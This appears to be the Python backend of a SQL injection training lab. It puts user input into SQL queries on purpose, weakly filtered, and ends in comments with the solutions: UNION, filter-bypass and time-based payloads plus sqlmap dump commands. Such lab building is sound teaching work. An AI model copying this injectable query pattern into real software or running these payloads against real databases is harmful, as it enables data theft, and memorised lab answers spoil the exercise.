import json
import mysql.connector
import re
from util import *

# From config load filter + sql query and then return results to user

with open('sqlilab.json') as json_data_file:
    data = json.load(json_data_file)

dbhost = data['config']['dbhost']
uname = data['config']['username']
pwd = data['config']['password']
dbname = data['config']['database']

def sqlinsert(labnum, query):
    dbport = "900{}".format(labnum)
    mydb = mysql.connector.connect(host=dbhost, user=uname, passwd=pwd, database=dbname, port=dbport)
    mycursor = mydb.cursor()
    print("Running query : {}".format(query))
    mycursor.execute(query)
    mydb.commit()

def sqlquery(labnum, query):
    dbport = "900{}".format(labnum)
    mydb = mysql.connector.connect(host=dbhost, user=uname, passwd=pwd, database=dbname, port=dbport)
    mycursor = mydb.cursor()
    try:
        mycursor.execute(query)
        myresult = mycursor.fetchall()
    except:
        pass
    
    try: myresult
    except: 
        return "Error! Added to Wall of Shame. Thanks"
    
    if len(myresult) == 0:
        return "No results"
    else:
        #print("Returning {}".format(myresult))
        return myresult

def processrequest(labnum, value, user):
    if labnum in data['labs'][0] and len(value) > 0:
        f = data['labs'][0][labnum]['Filter']
        cleanvalue = re.sub(f, '', value)
        query = data['labs'][0][labnum]['Query']
        query = query.replace('USERINPUTHERE', cleanvalue)
        print("Query : {0} Lab : {1}".format(query, labnum))
        out = sqlquery(labnum, query)
        if out == "Error! Added to Wall of Shame. Thanks":
            addtowallofshame(user, query)
        #print("Query : {}".format(query))
        return out
    else:
        #print("Invalid lab number or value")
        return "Invalid lab number"

def checkanswer(labnum, answer):
    q = sqlquery(labnum, "select * from secret;")
    theanswer = q[0][2]
    if answer == theanswer:
        return True
    else:
        return False

# 1) 1 UNION SELECT Name, Password FROM secret
# 2) 1' UNION SELECT Name, Password FROM secret -- -
# 3) 1/**/UNION/**/SELECT/**/Name,/**/Password/**/FROM/**/secret
# 4) 1 UNIOn SELECT Name, Password FROM secret
# 5) Time based 
#    Payload: value=1 AND (SELECT 1747 FROM (SELECT(SLEEP(5)))qZWz)&lab=4
#    sqlmap -u "http://10.24.0.137/lab4/" --data "value=1&lab=4" --cookie="sqlilab=phxwfwspqs"

# sqlmap -u "http://10.24.0.137/lab5/" --data "value=1&lab=5" -p value --cookie="sqlilab=fripqxejmw" --level 5 --dbms=mysql --risk 3 --dump -T secret --flush-session
